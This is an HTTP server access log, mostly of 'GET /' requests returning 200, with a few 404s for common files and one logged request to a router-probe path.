+[0mGET / [32m200 [0m0.618 ms - 1455[0m
+[0mGET / [32m200 [0m0.653 ms - 1455[0m
+[0mGET / [32m200 [0m0.852 ms - 1455[0m
+[0mGET / [32m200 [0m0.561 ms - 1455[0m
+[0mGET / [32m200 [0m7.024 ms - 1455[0m
+[0mGET / [32m200 [0m0.588 ms - 1455[0m
+[0mGET / [32m200 [0m0.588 ms - 1455[0m
+[0mGET / [32m200 [0m0.557 ms - 1455[0m
+[0mGET / [32m200 [0m0.586 ms - 1455[0m
+[0mGET / [32m200 [0m0.594 ms - 1455[0m
+[0mGET / [32m200 [0m0.604 ms - 1455[0m
+[0mGET / [32m200 [0m0.541 ms - 1455[0m
+[0mGET / [32m200 [0m1.106 ms - 1455[0m
+[0mGET / [32m200 [0m0.573 ms - 1455[0m
+[0mGET / [32m200 [0m0.577 ms - 1455[0m
+[0mGET / [32m200 [0m0.569 ms - 1455[0m
+[0mGET / [32m200 [0m0.543 ms - 1455[0m
+[0mGET / [32m200 [0m0.621 ms - 1455[0m
+[0mGET / [32m200 [0m1.132 ms - 1455[0m
+[0mGET / [32m200 [0m0.432 ms - 1455[0m
+[0mGET / [32m200 [0m0.557 ms - 1455[0m
+[0mGET / [32m200 [0m0.573 ms - 1455[0m
+[0mGET / [32m200 [0m1.166 ms - 1455[0m
+[0mGET / [32m200 [0m0.565 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.535 ms - 1455[0m
+[0mGET / [32m200 [0m0.597 ms - 1455[0m
+[0mGET / [32m200 [0m1.446 ms - 1455[0m
+[0mGET / [32m200 [0m1.578 ms - 1455[0m
+[0mGET /robots.txt [33m404 [0m4.039 ms - 1642[0m
+[0mGET /sitemap.xml [33m404 [0m0.798 ms - 1642[0m
+[0mGET /.well-known/security.txt [33m404 [0m0.850 ms - 1642[0m
+[0mGET /favicon.ico [33m404 [0m0.792 ms - 1642[0m
+[0mGET / [32m200 [0m0.628 ms - 1455[0m
+[0mGET / [32m200 [0m0.649 ms - 1455[0m
+[0mGET / [32m200 [0m0.597 ms - 1455[0m
+[0mGET / [32m200 [0m0.615 ms - 1455[0m
+[0mGET / [32m200 [0m0.574 ms - 1455[0m
+[0mGET / [32m200 [0m0.641 ms - 1455[0m
+[0mGET / [32m200 [0m0.564 ms - 1455[0m
+[0mPOST /tmUnblock.cgi [33m404 [0m1.246 ms - 1637[0m
+[0mGET / [32m200 [0m0.646 ms - 1455[0m
+[0mGET / [32m200 [0m0.629 ms - 1455[0m
+[0mGET / [32m200 [0m0.623 ms - 1455[0m
+[0mGET / [32m200 [0m0.663 ms - 1455[0m
+[0mGET / [32m200 [0m0.597 ms - 1455[0m
+[0mGET / [32m200 [0m1.298 ms - 1455[0m
+[0mGET / [32m200 [0m0.589 ms - 1455[0m
+[0mGET / [32m200 [0m0.614 ms - 1455[0m
+[0mGET / [32m200 [0m0.652 ms - 1455[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mGET / [32m200 [0m0.559 ms - 1455[0m
+[0mGET / [32m200 [0m0.635 ms - 1455[0m
+[0mGET / [32m200 [0m3.251 ms - 1455[0m
+[0mGET / [32m200 [0m0.617 ms - 1455[0m
